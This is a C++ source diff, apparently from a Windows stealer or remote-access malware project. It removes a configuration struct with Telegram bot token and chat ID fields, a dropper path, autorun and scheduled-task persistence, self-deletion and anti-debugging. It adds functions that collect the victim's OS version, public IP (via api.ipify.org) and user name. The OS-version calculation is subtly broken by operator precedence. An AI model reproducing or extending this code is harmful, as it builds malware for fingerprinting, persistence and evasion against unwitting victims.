@@ -22,41 +22,31 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 */
 
-#pragma once
-#ifndef MANAGER_H
-#define MANAGER_H
-#include "common.h"
+#include "Information.h"
+#include "Requests.h"
 
-#pragma pack(push, 1)
-struct Settings {
-	char botapi[128] = { 0 };
-	char chatid[128] = { 0 };
-	char drop[128] = { 0 };
-	bool drop_run;
+std::string GetOS() {
+	OSVERSIONINFOEX info;
+	ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
+	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+	GetVersionEx((LPOSVERSIONINFO)&info);
 
-	char scheduler_name[128] = { 0 };
-	bool scheduler_state;
+	double version;
 
-	char autorun[128] = { 0 };
-	bool autorun_state;
+	version = info.dwMajorVersion
+		+ (info.dwMinorVersion / 10.0)
+		- (info.wProductType == VER_NT_WORKSTATION) ? 0.5 : 0.0;
 
-	char client_delay[128] = { 0 };
-	bool auto_delete;
-	bool protect_debuggers;
-};
-#pragma pack(pop)
+	return std::to_string(version);
+}
 
-long GetFileSize(const char* filename);
-void ReadData(Settings* s);
+std::string GetIP() {
+	return GetRequest("api.ipify.org", "4B4DB4B3");
+}
 
-void Autorun(const char* path, const char* name);
-void Scheduler(const char* path, const char* name);
-
-void Protector();
-
-std::string ToLower(std::string str);
-std::vector<std::string> split(std::string str, char delim);
-
-bool FileExists(std::string name);
-
-#endif
+std::string GetPCName() {
+	char buff[512] = { 0 };
+	DWORD len = sizeof(buff) - 1;
+	GetUserNameA(buff, &len);
+	return buff;
+}
